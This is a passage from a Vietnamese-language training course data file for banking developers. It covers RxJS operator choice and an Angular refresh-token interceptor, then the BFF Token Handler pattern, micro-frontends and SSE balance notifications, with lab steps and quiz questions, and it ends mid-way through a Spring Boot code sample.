          "Chống vòng lặp vô tận (Infinite Loop): Không bao giờ áp dụng logic bắt `401 -> refresh` cho chính đường dẫn `/api/v1/auth/refresh` hay `/api/v1/auth/login` — nếu chính API refresh trả về `401/403`, phải dọn phiên và chuyển hướng về trang đăng nhập ngay."
        ]
      }
    ],
    comparison: {
      title: "Bảng quyết định chọn Toán tử RxJS trên Hệ thống Ngân hàng (Angular)",
      headers: ["Toán tử RxJS", "Cơ chế xử lý khi có sự kiện mới lúc lệnh cũ chưa xong", "Ứng dụng Đúng trong Ngân hàng", "Rủi ro nếu dùng sai chỗ"],
      rows: [
        [
          "`exhaustMap`",
          "Bỏ qua hoàn toàn mọi sự kiện mới cho đến khi Observable hiện tại hoàn tất (`complete`)",
          "Nút xác nhận Nộp/Rút tiền mặt tại quầy, Chuyển khoản, Duyệt lệnh giải ngân (Maker/Checker)",
          "Nếu đem dùng cho ô gõ tìm kiếm CIF thì những ký tự gõ cuối cùng lúc đang tải sẽ bị nuốt mất"
        ],
        [
          "`switchMap`",
          "Hủy đăng ký (`unsubscribe`) Observable cũ ngay lập tức và chuyển sang chạy Observable mới nhất",
          "Ô tìm kiếm khách hàng theo CCCD/SĐT, Tra cứu tên tài khoản thụ hưởng, Chuyển đổi tab xem báo cáo",
          "Dùng cho nút Nộp tiền/Chuyển khoản sẽ gây nhân bản giao dịch ở Backend vì hủy phía Client không dừng được DB Transaction đã chạy!"
        ],
        [
          "`concatMap`",
          "Đưa sự kiện mới vào hàng đợi FIFO, chờ Observable trước chạy xong hoàn toàn mới chạy tiếp cái sau",
          "Upload tuần tự từng trang chứng từ giải ngân có đánh số thứ tự, đồng bộ nhật ký thao tác offline",
          "Dùng cho nút Submit sẽ làm giao dịch viên bấm nhầm 3 cái thì hệ thống ngoan ngoãn thực hiện nối đuôi nhau đủ cả 3 giao dịch!"
        ],
        [
          "`mergeMap`",
          "Chạy song song tất cả các Observable ngay khi sự kiện phát sinh mà không chờ hay hủy bất kỳ cái nào",
          "Tải đồng thời nhiều danh mục độc lập lúc khởi tạo màn hình (Tỷ giá + Chi nhánh + Biểu phí)",
          "Nguy hiểm nhất nếu gắn vào nút giao dịch: bấm 5 lần bắn song song 5 lệnh rút tiền cùng lúc gây Race Condition"
        ]
      ]
    },
    codeTitle: "Angular Teller Service (`exhaustMap`) & HttpInterceptor Xếp hàng Refresh Token Chống Bão 401",
    code: [
      "import { Injectable, inject } from \"@angular/core\";",
      "import { HttpClient, HttpErrorResponse, HttpInterceptorFn } from \"@angular/common/http\";",
      "import { BehaviorSubject, Subject, catchError, exhaustMap, filter, finalize, switchMap, take, throwError } from \"rxjs\";",
      "",
      "@Injectable({ providedIn: \"root\" })",
      "export class TellerCashFacade {",
      "  private readonly http = inject(HttpClient);",
      "  private readonly depositTrigger$ = new Subject<{ accountNo: string; amountVnd: string; idemKey: string }>();",
      "  // Chặn tuyệt đối giao dịch viên gõ đúp phím Enter khi đang hạch toán tiền mặt tại quầy",
      "  readonly depositResult$ = this.depositTrigger$.pipe(",
      "    exhaustMap((cmd) => this.http.post(\"/api/v1/teller/cash-deposits\", cmd, { headers: { \"Idempotency-Key\": cmd.idemKey } }))",
      "  );",
      "  submitCashDeposit(cmd: { accountNo: string; amountVnd: string; idemKey: string }) { this.depositTrigger$.next(cmd); }",
      "}",
      "",
      "let isRefreshing = false;",
      "const refreshReady$ = new BehaviorSubject<boolean | null>(null);",
      "",
      "export const bankingAuthInterceptor: HttpInterceptorFn = (req, next) => {",
      "  const http = inject(HttpClient);",
      "  const tracedReq = req.clone({ withCredentials: true, setHeaders: { \"X-Correlation-Id\": crypto.randomUUID() } });",
      "  return next(tracedReq).pipe(",
      "    catchError((err: HttpErrorResponse) => {",
      "      if (err.status !== 401 || req.url.includes(\"/auth/refresh\")) return throwError(() => err);",
      "      if (isRefreshing) {",
      "        return refreshReady$.pipe(filter((ok) => ok === true), take(1), switchMap(() => next(tracedReq)));",
      "      }",
      "      isRefreshing = true;",
      "      refreshReady$.next(null);",
      "      return http.post(\"/api/v1/auth/refresh\", {}, { withCredentials: true }).pipe(",
      "        switchMap(() => { refreshReady$.next(true); return next(tracedReq); }),",
      "        catchError((refreshErr) => { window.location.assign(\"/teller/login?reason=expired\"); return throwError(() => refreshErr); }),",
      "        finalize(() => { isRefreshing = false; })",
      "      );",
      "    })",
      "  );",
      "};"
    ].join("\n"),
    codeNotes: [
      "Luồng `depositTrigger$` đi qua `exhaustMap`: Bất kể giao dịch viên nhấn phím tắt `Enter` 3 lần trong 100ms, `exhaustMap` khóa cổng không cho phần tử thứ 2 đi vào `this.http.post(...)` cho tới khi lệnh đầu tiên nhận phản hồi hoàn chỉnh từ Server.",
      "Tự động đính kèm `X-Correlation-Id` và `withCredentials: true`: Mỗi request từ quầy đều mang mã vết duy nhất để đội vận hành tra cứu Kibana/Grafana tức thì nếu chi nhánh báo lỗi, đồng thời cho phép gửi kèm Cookie phiên bảo mật.",
      "Cơ chế xếp hàng `refreshReady$` (`BehaviorSubject`): Request đầu tiên nhận `401` bật `isRefreshing = true` và đặt `refreshReady$.next(null)` làm rào chắn; mọi request song song dính `401` cùng thời điểm sẽ dừng lại ở `filter(ok => ok === true), take(1)` chờ đúng 1 lượt đổi phiên hoàn tất rồi tự động chạy lại!",
      "Điều kiện thoát `req.url.includes(\"/auth/refresh\")` + `finalize`: Đảm bảo nếu chính bản thân phiên Refresh cũng đã hết hạn ca làm việc thì điều hướng dứt khoát về màn hình đăng nhập chứ không lặp đệ quy vô tận, và luôn mở khóa `isRefreshing = false`."
    ],
    labGuide: {
      goal: "Kiểm chứng thực tế sức mạnh của `exhaustMap` khi spam phím Enter nộp tiền mặt và thử nghiệm bắn đồng thời 6 API khi hết hạn phiên để xác nhận chỉ có đúng 1 lệnh `/auth/refresh` được phát đi.",
      steps: [
        "Bước 1: Tạo ứng dụng Angular tối giản cấu hình `provideHttpClient(withInterceptors([bankingAuthInterceptor]))` và dựng một Mock Backend có độ trễ 1.5 giây cho API `POST /api/v1/teller/cash-deposits`.",
        "Bước 2: Bấm liên tục nút 'Hạch toán nộp tiền' (hoặc giữ phím Enter) 10 lần trong vòng 1 giây khi giao dịch đang chạy; kiểm tra log phía Mock Backend để chứng minh chỉ có ĐÚNG 1 request duy nhất tới được Server (thử đổi tạm `exhaustMap` sang `mergeMap` để thấy ngay 10 lệnh cộng tiền dội vào!).",
        "Bước 3: Cấu hình Mock Backend trả về `401 Unauthorized` cho 6 API tra cứu thông tin khách hàng được gọi đồng thời bằng `forkJoin`, và mở cổng `POST /api/v1/auth/refresh` cấp lại cookie mới sau 500ms.",
        "Bước 4: Mở tab Network quan sát trình tự: 6 API đầu báo `401` -> chỉ có **ĐÚNG 1 request `/api/v1/auth/refresh`** được gọi -> sau khi refresh trả `200 OK`, cả 6 API nghiệp vụ tự động được gọi lại thành công trọn vẹn."
      ],
      expectedOutput: "Spam phím Enter tại quầy chỉ tạo ra 1 giao dịch duy nhất; khi hết hạn Access Token giữa lúc tải 6 phân hệ song song, chỉ xuất hiện đúng 1 lệnh làm mới phiên và không xảy ra lỗi thu hồi nhầm do Refresh Token Rotation."
    },
    examTips: [
      "Câu hỏi phỏng vấn kinh điển vị trí Full-Stack / Tech Lead Ngân hàng: 'Tại sao dùng `switchMap` cho nút Submit vẫn bị nhân đôi bút toán dưới Core Banking?' -> Nhớ giải thích rõ: `unsubscribe()` của RxJS chỉ đóng socket lắng nghe trên trình duyệt, không thể dừng luồng Java `@Transactional` đã chạy bên trong máy chủ!",
      "Khi tích hợp với Keycloak / Identity Server có bật `Refresh Token Rotation` (dùng 1 lần), nếu đội chi nhánh than phiền 'Cứ mở trang Dashboard nhiều biểu đồ sau 5 phút nghỉ là bị văng đăng xuất ngẫu nhiên', hãy kiểm tra ngay xem `HttpInterceptor` đã có hàng đợi `BehaviorSubject` chống gọi `/refresh` song song hay chưa!",
      "Trên màn hình Teller làm việc cả ngày 8 tiếng, luôn nhắc đội Frontend hủy đăng ký Observable (`takeUntilDestroyed()`) khi đóng hộp thoại nghiệp vụ để tránh rò rỉ bộ nhớ trình duyệt máy quầy."
    ],
    summaryTakeaways: [
      "Angular với kiến trúc chặt chẽ (DI, Typed Reactive Forms, Signals, Interceptor) là nền tảng chủ lực cho hệ thống Quầy giao dịch và Core Back-Office quy mô lớn trong ngân hàng.",
      "Luôn dùng `exhaustMap` cho các thao tác Ghi giao dịch tài chính để vô hiệu hóa mọi cú bấm đúp/gõ đúp phím khi lệnh trước chưa kết thúc; dùng `switchMap` + `debounceTime` cho thao tác Đọc tìm kiếm.",
      "Hủy request ở phía trình duyệt (`switchMap` / tắt tab) KHÔNG đảm bảo hủy được giao dịch đã vào Backend — do đó vẫn luôn phải gửi kèm `Idempotency-Key`.",
      "`HttpInterceptor` bắt buộc phải có khóa điều phối (`isRefreshing` + `BehaviorSubject`) để gom mọi lỗi `401` đồng thời về chờ chung một lượt Refresh Token duy nhất."
    ],
    lessonQuestions: [
      {
        question: "Tại quầy giao dịch chi nhánh, để khắc phục lỗi giao dịch viên quen tay gõ đúp phím `Enter` trên bàn phím cơ làm phát sinh 2 lệnh nộp tiền mặt, một lập trình viên đã sửa code RxJS trên màn hình Angular từ `mergeMap` sang `switchMap`. Tuy nhiên trên môi trường UAT, khi gõ đúp `Enter` cách nhau 50ms, hệ thống Core Banking vẫn ghi nhận 2 bút toán cộng tiền vào tài khoản khách hàng dù trên màn hình quầy chỉ hiện 1 thông báo thành công! Giải thích nào đúng bản chất nhất và cách sửa triệt để là gì?",
        options: [
          "Do `switchMap` bị lỗi trên trình duyệt Chrome bản mới; cần viết hàm `setTimeout` chặn bàn phím trong 10 giây.",
          "Khi gõ lần 2, `switchMap` chỉ hủy lắng nghe phản hồi của request HTTP thứ nhất ở phía trình duyệt sau khi gói tin TCP đó ĐÃ được gửi tới Backend và đang hạch toán, rồi lập tức bắn thêm request thứ hai; phải đổi sang `exhaustMap` kết hợp gắn cố định `Idempotency-Key`.",
          "Do Angular HttpClient tự động nhân đôi mọi gói tin bị hủy; cần chuyển sang dùng `XMLHttpRequest` thuần.",
          "Cần đổi sang toán tử `concatMap` để hai cú gõ phím không chạy cùng lúc với nhau."
        ],
        answer: 1,
        explanation: "Khoảng trễ mạng LAN nội bộ chi nhánh xuống máy chủ rất nhỏ (< 5ms), nên sau 50ms request thứ nhất đã lọt vào tầng Service/DB của Backend. Hành động `unsubscribe()` của `switchMap` chỉ ngắt luồng nhận kết quả ở trình duyệt chứ không hủy được tiến trình hạch toán trên Server, đồng thời nó lại phát đi request thứ hai gây nhân đôi giao dịch. Toán tử `exhaustMap` chặn ngay từ gốc không cho cú gõ thứ hai phát sinh request HTTP nào khi lệnh đầu chưa hoàn tất.",
        wrongReasons: [
          "`switchMap` hoạt động đúng thiết kế đặc tả của nó (hủy luồng cũ, mở luồng mới), lỗi là do chọn sai toán tử cho thao tác ghi tài chính.",
          "",
          "Angular `HttpClient` không bao giờ tự nhân đôi gói tin bị hủy; nguyên nhân nằm ở việc cú gõ thứ hai chủ động kích hoạt luồng mới trong `switchMap`.",
          "`concatMap` chỉ xếp cú gõ thứ hai vào hàng đợi rồi chạy tiếp ngay sau khi lệnh thứ nhất xong — kết quả vẫn bị nộp tiền 2 lần liên tiếp!"
        ]
      },
      {
        question: "Ngân hàng vừa nâng cấp chính sách bảo mật trên Keycloak: giảm thời hạn `Access Token` xuống 5 phút và bật `Refresh Token Rotation` kèm tính năng phát hiện dùng lại (`Reuse Detection` — thu hồi toàn bộ phiên nếu một Refresh Token cũ bị gọi quá 1 lần). Ngay ngày đầu tiên, hàng trăm giao dịch viên phản ánh cứ mỗi lần tra cứu hồ sơ khách hàng (màn hình gọi đồng thời 5 API lấy tài khoản, thẻ, khoản vay, tiết kiệm, hạn mức) sau vài phút nghỉ tay là bị văng ra màn hình đăng nhập. Nguyên nhân gốc rễ nằm ở đâu?",
        options: [
          "Keycloak không chịu nổi tải của 5 API gọi cùng lúc nên tự động xóa tài khoản nhân viên.",
          "Thời hạn Access Token 5 phút quá ngắn so với chuẩn HTTP nên trình duyệt tự xóa Cookie.",
          "`HttpInterceptor` phía Angular chưa có cơ chế khóa xếp hàng (`Mutex / BehaviorSubject`), khiến cả 5 API cùng nhận `401` đồng thời đã bắn song song 5 lệnh `/auth/refresh` mang cùng một Refresh Token cũ, kích hoạt cơ chế chống đánh cắp `Reuse Detection` của Keycloak.",
          "Do trình duyệt chặn không cho gửi quá 4 request cùng lúc tới cùng một tên miền."
        ],
        answer: 2,
        explanation: "Khi 5 request nghiệp vụ phát đi song song đúng lúc Access Token vừa hết hạn, cả 5 đều nhận `401`. Không có cờ khóa `isRefreshing` và hàng đợi `BehaviorSubject`, Interceptor kích hoạt 5 request `/auth/refresh` mang cùng mã Refresh Token cũ. Request đầu tiên đổi thành công và vô hiệu hóa mã cũ; ngay mili-giây sau request thứ hai cầm mã cũ đó đập vào Keycloak bị coi là hành vi đánh cắp phát lại token, khiến Keycloak hủy toàn bộ phiên đăng nhập để bảo vệ an toàn.",
        wrongReasons: [
          "Keycloak chịu tải hàng nghìn RPS dễ dàng; việc hủy phiên là hành động bảo mật có chủ đích của tính năng `Reuse Detection` khi thấy cùng 1 token một-lần bị gọi lặp.",
          "Chuẩn HTTP hoàn toàn không áp đặt độ dài tối thiểu của Access Token; 3–5 phút là cấu hình tiêu chuẩn của các ngân hàng số hiện nay.",
          "",
          "Giới hạn kết nối đồng thời HTTP/1.1 (6 kết nối) hay HTTP/2 multiplexing không hề làm văng đăng xuất phiên xác thực."
        ]
      }
    ]
  },

  F5: {
    duration: "60 phút",
    difficulty: "Nâng cao – Kiến trúc BFF, Micro-Frontends & Real-time",
    codeLang: "java",
    teacherIntro: "Chào em, đây chính là bài học nối liền vai trò của một **Senior Java Backend** thành một **Solution Architect** thực thụ trong ngân hàng! Hãy thử hình dung ngân hàng của em có 45 Microservices nội bộ (Core CASA, Card, Loan, Loyalty, FX, VietQR, AML...) và 3 kênh giao diện khác nhau: Super App trên Mobile, Web Internet Banking cho cá nhân, và Cổng Ngân hàng Doanh nghiệp. Nếu cho trình duyệt và ứng dụng di động gọi thẳng vào 45 Microservices đó qua một API Gateway mỏng dính, chuyện gì sẽ xảy ra? Một màn hình Trang chủ trên mạng 4G chập chờn phải bắn 9 request rời rạc làm giao diện tải mất 4 giây; cấu trúc tên bảng/dịch vụ nội bộ bị phơi bày ra ngoài Internet; và tệ nhất là gánh nặng cầm giữ OAuth2 Access/Refresh Token bị đẩy hết sang phía JavaScript trình duyệt! Đó là lý do mọi ngân hàng hiện đại đều xây dựng tầng **BFF (Backend-for-Frontend)** bằng Spring Boot hoặc Node/Java 21 làm 'người đại diện riêng' cho từng kênh giao diện, kết hợp mô hình **Token Handler** và đường truyền **SSE (Server-Sent Events)** báo biến động số dư tức thời ngay khoảnh khắc khách quét mã VietQR.",
    analogy: {
      title: "Người Quản gia Riêng giữ hộ chùm chìa khóa két sắt và chiếc loa thông báo tiền về tại quầy thu ngân",
      body: "Em hãy hình dung hệ thống 45 Microservices bên trong ngân hàng giống như 45 phòng chuyên môn sâu trong tòa nhà trụ sở. Thay vì bắt vị khách ngoài sảnh (`Trình duyệt`) tự cầm bản đồ chạy qua 9 phòng khác nhau để xin số dư tài khoản, điểm thưởng, dư nợ thẻ và tự cầm chùm chìa khóa vạn năng (`OAuth2 Access/Refresh Token`) dễ đánh rơi dọc đường, ngân hàng cử cho kênh Web một **Người Quản gia Riêng (`Web BFF`)**. Khách chỉ cần giữ một tấm thẻ gửi đồ bằng nhựa không chứa bí mật (`Opaque HttpOnly Session Cookie`); mỗi khi khách cần xem tổng quan tài sản, Quản gia tự mở tủ két phía sau lấy chìa khóa thật (`JWT`), chạy vèo qua mạng cáp quang nội bộ gom đủ thông tin của 4 phòng trong 30ms, cắt gọt gọn gàng thành đúng 1 phong bì duy nhất đưa ra cho khách! Và khi cửa hàng tạp hóa dán mã VietQR trên quầy, thay vì bắt chủ quán cứ 2 giây lại chạy ra hỏi 'Có ai chuyển khoản chưa?', Quản gia nối sẵn một **đường dây loa một chiều (`SSE`)** — hễ có khách chuyển 55.000đ vào tài khoản là tiếng 'Tinh tinh: Đã nhận 55.000đ!' vang lên trên màn hình Web trong chưa đầy nửa giây!"
    },
    objectives: [
      "Thiết kế được kiến trúc `BFF (Backend-for-Frontend)` kết hợp `Token Handler Pattern` giữ trọn bộ OAuth2 Access/Refresh Token ở phía Server/Redis, không lộ bất kỳ JWT nào xuống trình duyệt.",
      "Hiểu rõ kiến trúc `Micro-Frontends (Module Federation)` cho Super App ngân hàng nhiều phân hệ (Tài khoản, Thẻ, Đầu tư, Bảo hiểm) triển khai độc lập mà vẫn dùng chung phiên bảo mật BFF.",
      "Phân biệt chính xác khi nào chọn `SSE (Server-Sent Events)` so với `WebSocket`, và xây dựng được luồng đẩy biến động số dư thời gian thực đa Pod qua `SseEmitter` + Redis Pub/Sub / Kafka."
    ],
    flow: [
      {
        step: "1. Đăng nhập OIDC PKCE & Giấu Token tại Tầng BFF (Token Handler)",
        detail: "BFF thực hiện bước đổi `authorization_code` với Keycloak, cất `access_token` và `refresh_token` vào Redis mã hóa, rồi chỉ trả về cho trình duyệt duy nhất một `__Host-ib_session` Cookie vô nghĩa về mặt mật mã."
      },
      {
        step: "2. Tổng hợp Dữ liệu Đa dịch vụ Song song (Parallel Aggregation)",
        detail: "Khi Web gọi `GET /bff/v1/dashboard`, BFF dùng Java 21 Virtual Threads / WebClient gọi đồng thời sang Account, Card và Loan Service bằng JWT nội bộ, cắt bỏ các trường thừa và trả về 1 gói JSON tối ưu riêng cho màn hình Web."
      },
      {
        step: "3. Tích hợp Đa Phân hệ Giao diện qua Micro-Frontends",
        detail: "Ứng dụng vỏ (`App Shell`) tải động các phân hệ độc lập (Thẻ tín dụng, Trái phiếu, Bảo hiểm) qua Module Federation; tất cả cùng đi qua một cổng tên miền BFF thống nhất không lo xung đột phiên hay CORS phức tạp."
      },
      {
        step: "4. Đẩy Biến động Số dư & Xác nhận VietQR Tức thời qua SSE",
        detail: "Khi Core Ledger phát sự kiện cộng tiền lên Kafka/Redis Pub/Sub, Pod BFF đang giữ kết nối `SseEmitter` của khách hàng đó lập tức đẩy sự kiện `BALANCE_UPDATED` xuống trình duyệt qua kênh HTTP/2 một chiều nhẹ nhàng."
      }
    ],
    sections: [
      {
        heading: "1. BFF & Token Handler Pattern: Chuẩn vàng OAuth 2.0 cho Ứng dụng Trình duyệt Ngân hàng",
        paragraphs: [
          "Theo khuyến nghị mới nhất của tổ chức chuẩn hóa Internet **IETF (`OAuth 2.0 for Browser-Based Applications - BCP`)**, cách an toàn nhất để bảo vệ Access Token và Refresh Token trên trình duyệt là **không bao giờ đưa chúng xuống trình duyệt ngay từ đầu!** Đây chính là trái tim của mô hình **BFF Token Handler Pattern** đang được các ngân hàng số thế hệ mới áp dụng triệt để. Thay vì để code React/Angular tự giữ JWT và tự viết logic xoay vòng Refresh Token phức tạp dễ dính lỗi lộ dữ liệu, tầng **Spring Boot BFF** đứng ngay sát trình duyệt đóng vai một OAuth2 Confidential Client chính hiệu (có Client Secret / mTLS bảo mật riêng nói chuyện với Keycloak).",
          "Luồng vận hành sạch sẽ đến ngỡ ngàng: Khi khách đăng nhập xong, BFF nhận cặp `access_token` + `refresh_token` từ Identity Server, lưu vào **Redis Cluster** với khóa là một mã phiên ngẫu nhiên độ hỗn loạn cao (`sessionId`), và gửi mã phiên đó về trình duyệt dưới dạng `__Host-ib_session` (`HttpOnly; Secure; SameSite=Strict`). Mỗi khi trình duyệt gọi `/bff/v1/transfers`, BFF tra cứu Redis bằng cookie phiên: nếu thấy `access_token` sắp hết hạn trong vòng 30 giây tới, chính BFF tự động gọi sang Keycloak đổi lấy token mới ngay trên mạng nội bộ tốc độ gigabit (tránh hoàn toàn lỗi bão `401` phía trình duyệt!), sau đó đính `Authorization: Bearer <access_token>` gọi xuống các Microservices phía sau! Nếu phát hiện tài khoản có dấu hiệu bị lừa đảo cần khóa khẩn cấp, bộ phận An ninh chỉ cần xóa đúng 1 key trong Redis của BFF là phiên giao dịch bị cắt đứt ngay tức khắc 100% mà không phải chờ hết hạn JWT!"
        ],
        bullets: [
          "Tách riêng BFF theo Kênh (One BFF per Experience): Web Ngân hàng Cá nhân có `retail-web-bff`, Cổng Doanh nghiệp có `corp-web-bff` (thêm luồng duyệt nhiều cấp Kế toán trưởng -> Giám đốc), Mobile App có `mobile-bff` tối ưu gói tin nén nhỏ cho sóng 4G.",
          "Chống phình to thành 'Fat BFF': Tầng BFF CHỈ được phép làm nhiệm vụ chuyển đổi xác thực, tổng hợp giao diện (Aggregation), cắt gọt DTO và điều phối kênh truyền — tuyệt đối KHÔNG viết quy tắc hạch toán kế toán hay tính lãi suất bên trong BFF!",
          "Tăng tốc gấp 3 lần màn hình Trang chủ với Java 21 Virtual Threads: Thay vì trình duyệt gọi nối tiếp 5 API mất $5 \\times 60\\text{ms} = 300\\text{ms}$ qua mạng Internet, BFF gọi song song 5 Microservices qua mạng LAN nội bộ chỉ mất bằng thời gian của dịch vụ chậm nhất (~45ms)."
        ]
      },
      {
        heading: "2. Micro-Frontends cho Super App Ngân hàng: Chia để trị cho đội ngũ 200 Kỹ sư",
        paragraphs: [
          "Giống hệt như phía Backend khi một khối Monolith phình lên 1 triệu dòng code phải tách thành Microservices theo từng miền nghiệp vụ (Bounded Context), ở phía Frontend một cổng Ngân hàng Số hợp nhất (hội tụ Thanh toán CASA, Quản lý Thẻ tín dụng, Mua bán Chứng chỉ quỹ / Trái phiếu, Bảo hiểm trực tuyến, Vay thấu chi online) do 8–10 Squad độc lập cùng phát triển nếu nhét chung vào một kho code React/Angular duy nhất sẽ biến mỗi tối Release thành cơn ác mộng: đội Đầu tư sửa một biểu đồ chứng khoán cũng bắt cả đội Chuyển tiền lõi phải regression test và deploy lại toàn bộ trang web!",
          "Kiến trúc **Micro-Frontends** (phổ biến nhất hiện nay qua cơ chế **Module Federation** của Webpack/Rspack) cho phép tách giao diện lớn thành một **Ứng dụng Vỏ (`Host / App Shell`)** chịu trách nhiệm khung điều hướng chung, đăng nhập phiên, thông báo toàn cục, và nạp động các phân hệ con (`Remotes`: `mfe-payments`, `mfe-cards`, `mfe-wealth`) được build và triển khai độc lập bởi từng Squad. Khi kết hợp **Micro-Frontends + BFF cùng tên miền**, sức mạnh cộng hưởng phát huy tối đa: mọi phân hệ con khi gọi về `/bff/cards/...` hay `/bff/wealth/...` đều tự động thừa hưởng chung chính chiếc cookie `__Host-ib_session` của App Shell mà không bao giờ phải truyền tay chuỗi Access Token qua lại giữa các phân hệ giao diện (nơi rất dễ lộ điểm yếu nếu một phân hệ phụ dùng thư viện kém an toàn hơn)!"
        ],
        bullets: [
          "Cô lập lỗi giao diện (`Error Boundary` theo từng phân hệ): Nếu phân hệ biểu đồ Đầu tư gặp lỗi runtime JS, khung `ErrorBoundary` của App Shell chỉ khoanh vùng thông báo bảo trì riêng ô Đầu tư, trong khi khách hàng vẫn Chuyển tiền và Thanh toán hóa đơn bình thường 100%.",
          "Chia sẻ Hệ thống Thiết kế (`Shared Design System`) & Thư viện lõi: Cấu hình `singleton: true` cho `react`, `react-dom` và bộ UI Component chuẩn thương hiệu ngân hàng để trình duyệt không phải tải lặp lại 5 bản React nặng nề.",
          "Giao tiếp lỏng lẻo giữa các Micro-Frontend: Chỉ trao đổi qua URL Router hoặc sự kiện chuẩn hóa nhẹ (`CustomEvent` mang ID tham chiếu), tránh dùng chung một biến Global Store khổng lồ làm các đội bị trói chặt trở lại thành Distributed Monolith."
        ]
      },
      {
        heading: "3. Thông báo Biến động Số dư Thời gian thực: Khi nào chọn `SSE`, khi nào chọn `WebSocket`?",
        paragraphs: [
          "Hãy xét một tính năng 'ăn tiền' bậc nhất hiện nay tại Việt Nam: màn hình **Thu hộ / Thanh toán động bằng mã VietQR** trên Web quản lý bán hàng hoặc màn hình Internet Banking chờ nhận tiền. Ngay khoảnh khắc người mua quét mã QR trên điện thoại và chuyển khoản thành công qua NAPAS 24/7, màn hình Web của người bán phải tự động bật tích xanh xác nhận *'Đã nhận đủ 1.250.000đ'* kèm hiệu ứng âm thanh trong dưới 1 giây mà không cần bấm tải lại trang. Nhiều bạn theo phản xạ liền dựng ngay cụm **WebSocket (STOMP/SockJS)** phức tạp — nhưng thực tế cho bài toán **chỉ đẩy thông báo một chiều từ Server xuống Trình duyệt**, giao thức chuẩn HTML5 **`SSE (Server-Sent Events)` (`Content-Type: text/event-stream`)** vượt trội hơn hẳn về độ đơn giản và độ ổn định vận hành!",
          "Vì sao các kiến trúc sư ngân hàng rất chuộng `SSE` cho thông báo biến động số dư và trạng thái giao dịch? Thứ nhất, `SSE` chạy thuần túy trên giao thức HTTP chuẩn (không cần bước nâng cấp giao thức `101 Switching Protocols` của WebSocket vốn rất hay bị các Firewall/Proxy doanh nghiệp cắt đứt giữa chừng). Thứ hai, khi chạy trên nền **HTTP/2 hoặc HTTP/3**, hàng chục luồng SSE và các lệnh gọi REST thông thường được ghép kênh (Multiplexing) chung trên **một kết nối TCP duy nhất**, khắc phục hoàn toàn giới hạn 6 kết nối đồng thời của HTTP/1.1 cũ! Thứ ba, API `EventSource` nguyên bản của trình duyệt hỗ trợ sẵn cơ chế tự động kết nối lại kèm gửi header `Last-Event-ID` để bù các thông báo bị lỡ lúc rớt mạng vài giây. Tất nhiên, ở môi trường Kubernetes chạy 10 Pod BFF phía sau Load Balancer, khách hàng A mở kết nối `SseEmitter` ở `Pod-1` nhưng sự kiện Kafka cộng tiền lại được `Pod-4` đọc được — vì vậy em nhớ phải dùng **Redis Pub/Sub** hoặc **Kafka Broadcast** để chuyển tiếp sự kiện tới đúng Pod đang giữ ống kết nối của khách hàng đó!"
        ],
        bullets: [
          "Khi nào chọn `SSE` vs `WebSocket`: Chọn `SSE` cho luồng 1 chiều Server -> Client (Biến động số dư, Xác nhận VietQR đã thanh toán, Tiến độ xuất sao kê lớn, Tỷ giá nhảy tự động); chỉ chọn `WebSocket` khi cần giao tiếp 2 chiều liên tục độ trễ cực thấp (Sổ lệnh đặt mua/bán Chứng khoán trực tuyến, Chat trực tiếp với tổng đài viên).",
          "Tắt bộ đệm Proxy (`X-Accel-Buffering: no`): Trên Nginx / Ingress đứng trước Spring Boot BFF, bắt buộc trả header `X-Accel-Buffering: no` và `Cache-Control: no-cache`, nếu không Nginx sẽ gom đủ 4KB dữ liệu mới xả xuống khiến thông báo biến động số dư bị om trễ cả phút!",
          "Gửi nhịp tim (`Heartbeat Comment`) mỗi 15–25 giây: Phát gói tin comment rỗng `: keepalive\\n\\n` định kỳ để ngăn Load Balancer / NAT Firewall tự động cắt các kết nối HTTP đứng im quá 60 giây."
        ]
      }
    ],
    comparison: {
      title: "Bảng so sánh các phương thức Giao tiếp Thời gian thực cho Ngân hàng Số",
      headers: ["Tiêu chí Kiến trúc", "Short Polling (Hỏi định kỳ)", "SSE (Server-Sent Events)", "WebSocket (Full-Duplex)"],
      rows: [
        [
          "Chiều truyền dữ liệu & Giao thức",
          "Client chủ động hỏi lặp lại qua HTTP thường",
          "Một chiều từ Server đẩy xuống Client trên nền HTTP/2 chuẩn (`text/event-stream`)",
          "Hai chiều song công toàn phần qua giao thức `wss://` (nâng cấp từ HTTP `101`)"
        ],
        [
          "Độ tương thích Firewall / Proxy & Cookie",
          "Tương thích 100% mọi hạ tầng mạng",
          "Rất cao — Đi qua cổng HTTPS chuẩn, tự động gửi kèm `HttpOnly` Cookie của cùng miền BFF",
          "Dễ bị Proxy nội bộ doanh nghiệp chặn Upgrade; cân bằng tải L7 Stateful phức tạp hơn"
        ],
        [
          "Tự động kết nối lại & Bù tin nhỡ",
          "Phụ thuộc code vòng lặp tự viết (như TanStack Query)",
          "Có sẵn nguyên bản trong `EventSource` kèm header `Last-Event-ID` để Server phát bù tin bị lỡ",
          "Không có sẵn chuẩn tự nối lại hay đánh dấu tin nhỡ — phải tự cài đặt toàn bộ ở tầng ứng dụng"
        ],
        [
          "Bài toán Ngân hàng Phù hợp nhất",
          "Kiểm tra trạng thái ngắn hạn (< 30s) hoặc dự phòng khi rớt kênh stream",
          "Thông báo biến động số dư tức thời, Chờ khách quét thanh toán VietQR, Cảnh báo hoàn tất Batch",
          "Bảng điện giao dịch Chứng khoán/Phái sinh hai chiều, Live Chat hỗ trợ khách hàng VIP"
        ]
      ]
    },
    codeTitle: "Spring Boot 3 BFF: Giải mã Phiên Token Handler từ Redis & Đẩy Biến động Số dư Tức thời qua SseEmitter",
    code: [
      "@RestController",
      "@RequestMapping(\"/bff/v1\")",
      "public class RetailBankingBffController {",
      "    private final StringRedisTemplate redis;",
      "    private final RestClient coreAccountClient;",
      "    private final Map<String, SseEmitter> emittersByCif = new ConcurrentHashMap<>();",
      "",
      "    public RetailBankingBffController(StringRedisTemplate redis, RestClient coreAccountClient) {",
      "        this.redis = redis; this.coreAccountClient = coreAccountClient;",
      "    }",
      "",
      "    @GetMapping(\"/dashboard/summary\")",
      "    public AccountSummaryView getDashboard(@CookieValue(\"__Host-ib_session\") String sessionId) {",
      "        String jwt = redis.opsForValue().get(\"bff:sess:jwt:\" + sessionId); // Token không bao giờ lộ ra Browser",
      "        if (jwt == null) throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, \"SESSION_EXPIRED\");",
      "        return coreAccountClient.get().uri(\"/internal/v1/accounts/summary\")",
      "            .header(HttpHeaders.AUTHORIZATION, \"Bearer \" + jwt).retrieve().body(AccountSummaryView.class);",
      "    }",
      "",
      "    @GetMapping(path = \"/notifications/stream\", produces = MediaType.TEXT_EVENT_STREAM_VALUE)",
